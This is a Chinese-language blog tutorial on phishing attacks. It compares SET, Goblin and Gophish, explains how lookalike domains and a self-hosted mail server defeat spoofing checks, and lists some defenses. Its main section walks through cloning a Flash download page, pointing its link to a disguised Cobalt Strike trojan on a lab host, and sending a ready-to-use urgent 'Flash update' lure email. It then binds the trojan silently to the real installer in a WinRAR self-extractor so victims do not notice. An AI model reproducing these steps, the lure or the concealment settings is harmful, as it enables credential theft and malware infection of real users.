使用 goblin 反向代理，ProxyPass 填写精确到 xxx.html 页面，但是访问根路径仍然代理到后端网站根目录，能够访问后端站点全部资源，如何限制只允许访问单个 html 页面？？？

编写插件做 URL 白名单过滤? 

---

7. 登录，捕获账号密码

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782922507_nllfnd.webp)

打开 `access.log`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782924597_w9nzt8.webp)

---

## 5.  三工具对比
### 5.1 SET 社工工具
+ **模式**：静态克隆 / 本地HTML导入
+ **能力**：网页钓鱼、少量邮件、payload生成
+ **特点**：命令行、简单稳定、无目录泄露
+ **短板**：抓不到AJAX动态网站（163）密码、不能批量发邮件
+ **用途**：自制静态登录页钓鱼

---

### 5.2 Goblin 反向代理钓鱼
+ **模式**：AiTM实时反向代理（非静态克隆）
+ **能力**：劫持动态AJAX登录、可抓163密码、高度仿真
+ **特点**：只代理网页、**不能发邮件**、必须常驻后端PHPStudy
+ **致命坑**：无论是否指定单页面，默认代理整站，易泄露全站文件
+ **用途**：高仿动态官网、中间人流量劫持

---

### 5.3 Gophish 企业钓鱼平台
+ **模式**：静态页面克隆
+ **能力**：批量发钓鱼邮件、模板管理、用户分组、行为监控、自动报表
+ **特点**：Web图形化、企业演练专用、无目录泄露
+ **短板**：静态页面抓不到AJAX密码、自带X-Gophish指纹易被检测
+ **最佳组合**：Gophish（发邮件）+ Goblin（动态网页劫持）

---

### 5.4 三工具对比总表
| **工具** | **核心定位** | **网页模式** | **发邮件** | **核心优势** | **短板/坑** |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **SET** | 综合社工工具箱 | 静态克隆 / 本地HTML导入 | 少量发送 | 命令行、简单稳定、无目录泄露 | 抓不到AJAX动态网站密码、不能批量 |
| **Goblin** | 网页中间人(AiTM)代理 | 实时反向代理 | ❌不能 | 劫持动态AJAX登录、可抓163密码、高度仿真 | 默认代理整站、易泄露全站文件、后端必须常驻 |
| **Gophish** | 企业邮件钓鱼一体化平台 | 静态页面克隆 | ✅批量群发 | Web图形化、模板/分组/监控/报表全套、无目录泄露 | 静态页抓不到AJAX密码、自带X-Gophish指纹 |


---

# 四、搭建邮件服务器
简单修改邮件发件人地址会留下转发标记，可信度低；想要实现高可信度钓鱼邮件，应当注册形近仿冒域名并搭建自有邮件服务器，配置域名解析记录，消除转发痕迹，达到以假乱真的效果。



## 1. 普通伪造邮件的缺陷（使用邮件客户端工具直接改发件人）
直接伪造From发件人地址，**没有自己的邮件服务器**

+ 邮箱服务商的反垃圾校验（SPF、DKIM、DMARC）大概率拦截、标记为垃圾邮件
+ 邮件头部会暴露转发、代发痕迹，页面提示：**「由 xxx 转发」「通过xxx发送」**
+ 受害者一眼看出异常，可信度低，钓鱼容易失败

本质：我们只是借用了别人的邮件服务器发送伪造发件人，不是域名真正的发信源。

---

## 2. 高仿真钓鱼最优方案（以假乱真）
两个必备条件：

1. **注册一个相似域名（形近域名 / 钓鱼域名）** 例：官方 `@163.com`，仿冒域名 `@163c.om`、`@16‑3.com`
2. **自己搭建一台独立邮件服务器（Postfix等）**
    - 在自建邮件服务器配置好域名解析记录：**SPF、DKIM、DMARC**
    - 以这个仿冒域名真实向外发送邮件

效果：邮件从我们自己的服务器发出，**不存在“由xxx转发”标记**； 邮件头完全合法，没有代发痕迹；收件人看到的发件人就是仿冒域名，迷惑性极强。

> 例如：https://96.cdn-dintalk.com.cn/
>

---

## 3. 概念区分
1. **浅层伪造（改From头）** 无需服务器，仅修改邮件头部；容易暴露，可信度差。
2. **域名仿冒+自建邮件服务器（深层钓鱼）** 拥有独立域名与发信服务器，邮件链路完全可控；隐蔽性、可信度最高。

---

# 五、如何防范邮件钓鱼？
## 1. 人为安全防范
1. **慎重点击可疑链接**  
点击前鼠标悬停链接，查验真实跳转网址，钓鱼页面外观可以高仿官网。
2. **注意附件内容**  
谨慎下载未知附件，先核查发件人真实邮箱地址；警惕银行通知、密码变更类伪装文档。
3. **核查电子邮件域名**  
不能只看显示名称，检查发件人真实邮箱域名是否为官方域名。
4. **小心自动下载**  
警惕整封邮件作为超链接，单击邮件任意位置就跳转恶意网站、自动下载恶意文件。
5. **警惕诱导话术**  
中奖、免费礼品、限时操作等话术，诱导你交出账号、验证码等敏感信息。
6. **不对焦虑类邮件立刻行动**  
遇到制造紧迫感、催促马上处理的邮件，保持冷静，暂缓操作。
7. **高管冒充钓鱼（CEO 钓鱼）处置流程**  
收到高管紧急请求转账、索要密码，**不要直接执行**；通过电话、企业微信等其他渠道二次核实；企业减少邮件附件下发文档。
8. **外部邮件标记**  
利用邮箱技术策略，把非本公司域名发来的邮件标记【外部】，提醒员工提高警惕。

---

## 2. 域名‑服务器侧技术防御
1. 部署邮件安全网关，沙箱检测附件、恶意链接扫描
2. 域名配置 **SPF + DKIM + DMARC** 三条DNS解析记录，拦截域名伪造
3. 开启邮箱反欺骗防护，拦截显示名伪装攻击

---

## 3. 中招之后应急措施
1. 不继续点击链接、附件，不要回复钓鱼邮件
2. 标记钓鱼邮件、上报管理员
3. 立刻修改泄露账号密码，开启二次验证MFA

---

# 六、钓鱼示例
**邮件钓鱼配合网页钓鱼实现CS上线**

模拟发送钓鱼邮件，诱导目标点击下载内容，最后运行上线。

## 1. 启动 CS
服务端

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782927094_8gt8ra.webp)

要等一段时间

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782928853_4ouq5z.webp)

客户端

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782930623_jygtf5.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782932494_q5g599.webp)

连接成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782934111_ssv8hq.webp)

## 2. 生成木马
具体操作步骤：

[内网渗透工具-Cobalt Strike](https://jasmine-iris.top/2026/08/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-Cobalt-Strike/)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782935858_m4f122.webp)

## 3. 下载需要伪造的网站
示例：[https://www.flash.cn/](https://www.flash.cn/)

1. 另存

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782938263_mposbr.webp)

放到 phpstudy 的网站根目录

---

2. 查看 html 源码

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782940052_gi2kvu.webp)

---

3. 查看原来的下载链接

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782943009_l2f723.webp)

`https://www.flash.cn/cdm/hm/latest/flashplayer_install_cn_fc.exe`

---

4. 查找链接

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782945744_80wkpg.webp)

---

5. 将原来的下载地址改成下载木马的地址，但是我们的木马和真正的程序还有差别，比如图标，程序名字。这里要用到一个工具----资源修改器，将我们的木马伪装。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782948148_5nplo1.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782949175_p0ovtb.webp)

把需要修改的信息拖到木马那儿，再另存

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782951432_aldg3x.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782953189_cyyuxg.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782954653_so0zla.webp)

---

6. 把我们伪造好的木马，放到 phpstudy 的 www 目录下，并开启 phpstudy

木马下载地址：`http://192.168.2.101:81/flashplayer_install_cn_fc.exe`

---

7. 把原来的下载地址全部替换

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782956186_6nvohm.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782958380_nvio3p.webp)

---

8. 测试

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782960765_2kdfzr.webp)

## 4. 发送钓鱼邮件
使用 gophish

钓鱼邮件(直接让 AI 生成）：

Subject： 【紧急通知】Adobe Flash Player 安全组件需要更新  

```plain
<p>&#123;&#123;.FirstName&#125;&#125; 您好：</p>
<p>系统检测到您计算机内安装的 Adobe Flash Player 版本老旧，存在高危安全漏洞。
内部业务系统的文档预览、多媒体模块将陆续无法正常加载。</p>
<p>请访问下方页面下载最新官方修复包完成升级：</p>
<p><a href="&#123;&#123;.URL&#125;&#125;">&#123;&#123;.URL&#125;&#125;</a></p>
<p>打开页面后，点击蓝色【立即下载】按钮获取更新程序，运行安装包后重启电脑生效。</p>
<p><strong>请在24小时内完成更新，避免影响日常办公！</strong></p>
<br>
<p>信息技术运维部</p>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782962786_76dd8k.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782964800_p8p2un.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782966716_1q4t4r.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782968728_f8dnou.webp)

直接单独下发木马程序，运行没有窗口，受害者很容易察觉到异常。因此采用文件捆绑思路：把原版 Flash 安装包和后门捆绑成同一个 exe。 

受害者下载文件双击启动后，页面上会弹出正常的 Flash 安装界面，看起来就是常规软件更新；与此同时后台悄悄运行我们的木马。  

## 4. 文件捆绑--工具 WinRAR
<font style="color:rgb(51, 51, 51);">文件捆绑操作：</font>[https://mp.weixin.qq.com/s/ReZntZqfGJlDNDS4FhDTxQ](https://mp.weixin.qq.com/s/ReZntZqfGJlDNDS4FhDTxQ)

<font style="color:rgb(51, 51, 51);">免费图标下载：</font>[https://mp.weixin.qq.com/s/QDNIOvkWDROkbsAiNZjshQ](https://mp.weixin.qq.com/s/QDNIOvkWDROkbsAiNZjshQ)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782970615_dtmf3y.webp)

1. 捆绑内容： 
    - 1.exe 原版 Flash 正规安装程序（前台展示安装界面）
    - flashplayer_install_cn_fc.exe CS 生成恶意载荷（后台执行）
2. SFX 配置解压路径：`%TEMP%\Flash`

### Q1：`%TEMP%`是什么？
+ `%TEMP%` 叫做**环境变量**
+ 代表 Windows 的**临时文件夹路径** 每一个登录的用户都有属于自己的 Temp 目录

```plain
C:\Users\xxx\AppData\Local\Temp
```

`%TEMP%` = 一个快捷代号，不需要手动写一长串 C 盘路径，Windows 自动翻译成本机的临时目录。

---

### 4.1 步骤
#### 4.1.1 选中全部文件，右键添加压缩包
#### 4.1.2 勾选【创建自解压格式压缩文件】
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782972065_fv7p97.webp)

---

#### 4.1.3 进入【高级→自解压选项】
#### <!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782973890_w7x5vb.webp)
#### <font style="color:rgb(0, 0, 0);">4.1.4 常规：解压路径</font>`<font style="color:rgb(0, 0, 0);">%TEMP%\Flash</font>`<font style="color:rgb(0, 0, 0);">，选中【绝对路径】</font>
<font style="color:rgba(0, 0, 0, 0.9);">设置解压路径：</font>

> <font style="color:rgba(0, 0, 0, 0.9);">C:\Program Files</font>
>
> <font style="color:rgba(0, 0, 0, 0.9);">C:\Program Files (x86)</font>
>
> <font style="color:rgba(0, 0, 0, 0.9);">C:\Program Files (x86)\Microsoft\Temp</font>
>
> <font style="color:rgba(0, 0, 0, 0.9);">C:\Windows\SystemTemp</font>
>
> <font style="color:rgba(0, 0, 0, 0.9);">C:\ProgramData\Microsoft\Search\Data\Temp</font>
>
> **<font style="color:rgb(51, 51, 51);">以上这些路径都是系统的路径</font>**
>

<font style="color:rgb(51, 51, 51);">这里以 </font>`<font style="color:rgb(0, 0, 0);">%TEMP%\Flash</font>`<font style="color:rgb(0, 0, 0);">演示</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782975391_planu3.webp)

---

#### 4.1.5 设置：填入两个待运行 exe，先正常程序、后木马  
```plain
%TEMP%\Flash\1.exe
%TEMP%\Flash\flashplayer_install_cn_fc.exe
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782977177_jh5uox.webp)

---

#### 4.1.6 模式：隐藏全部窗口  
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782979027_tshgvq.webp)

---

#### 4.1.7 运行，木马成功上线！
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782981193_ajee6f.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782982861_t3pf49.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782984464_42u352.webp)

---

#### 4.1.8 其他板块属于可选配置  
1. <font style="color:rgb(51, 51, 51);">切换到 "更新" ，选择 "覆盖所有文件"</font>

> <font style="color:rgb(51, 51, 51);">自解压程序覆盖方式设置为「覆盖所有文件」，目的是实现静默解压，文件冲突时无需用户交互弹窗，降低钓鱼载荷被受害者察觉的概率。 属于</font>**优化项，不是启动必须项**<font style="color:rgb(51, 51, 51);"> </font>
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782986448_t26vjo.webp)

---

2. **【文本】标签** → 控制解压弹窗文字、报错提示文字

留白，目的：双击捆绑 exe**不会弹出解压提示窗口**，实现静默解压。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782987961_2oxhif.webp)

3. **【徽标和图标】标签** 

> 图标：生成后 exe 文件的外观，用于伪装；徽标：解压弹窗内的 logo 图片，开启隐藏全部窗口后不会显示，无需配置徽标。  
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782989422_2x1zto.webp)

4. **【许可证】标签** → 用户许可协议，弹出「我接受」确认框

留白，原因： 启用许可证选项后，双击自解压程序会弹出许可协议确认窗口，需要用户手动点击接受才可继续执行。该弹窗属于 WinRAR 自解压特有界面，容易被用户识别出自解压程序身份，破坏伪装效果，因此钓鱼实验中许可证板块建议保持关闭。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782990679_y3cc96.webp)

类似这种弹窗：



<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782992128_o8u9hp.webp)

---

### 4.2 其他思路
#### 4.2.1 <font style="color:rgb(51, 51, 51);">CS实现邮件钓鱼</font>
**<font style="color:#df2a3f;background-color:#fbde28;">配置基本和 gophish 差不多</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782993231_pjkrkf.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782994653_ml8a38.webp)

---

#### 4.2.2 白加黑
[https://mp.weixin.qq.com/s/Sfo4OCIK41uVEwjZmEYxGQ](https://mp.weixin.qq.com/s/Sfo4OCIK41uVEwjZmEYxGQ)

---

# 七、总结
## Q1： 为什么可以进行邮件伪造？  
SMTP 协议本身**不对发件人身份做校验**；若域名没有部署 SPF 等邮件身份验证 DNS 记录，接收邮件服务器无法判断邮件来源是否合法，因此能够伪造发件人。



注： SMTP 本身**不会阻止伪造，**SPF/DKIM/DMARC 是**额外的 DNS 补充防护**，不是 SMTP 协议自带功能。  

## Q2：SPF 有什么作用？  
SPF 是 DNS TXT 记录，声明哪些服务器允许代表本域名发送邮件；接收服务器拿到邮件后查询 SPF，校验发送 IP 是否在许可列表，用来**防范邮件伪造**。  

但是配置了 SPF 也不一定完全防住伪造：

+ 如果 SPF 是`~all`软失败，只会标记垃圾邮件，邮件仍然可以投递；
+ SPF 只校验信封发件人（Mail‑From），**不能防显示名钓鱼**，需要 DKIM+DMARC 配合。

## Q3：收到可疑钓鱼邮件，如何找真实发件账号？ 
查看邮件原始源码，读取`Return‑Path`字段，该字段对应信封发件人， 不能只看页面展示的发件人。 

## Q4：Gophish 使用 163 的 SMTP 发送钓鱼邮件出现 `553 Mail from must equal authorized user`，请说明原因和解决方法。
原因：第三方 SMTP 服务商校验信封发件人（MAIL FROM），信封发件人与 SMTP 登录账号不一致，服务器拒绝发送邮件。 

解决：模板中 Envelope Sender 置空；Sending Profile 中的 SMTP From 与 Username 填写同一个真实邮箱。  

## Q3：页面存在`<form>`标签，SET 依然抓不到密码是什么原因？
JS 脚本拦截 form 默认提交事件，改用 AJAX 异步请求发送数据，绕过浏览器原生表单提交流程。







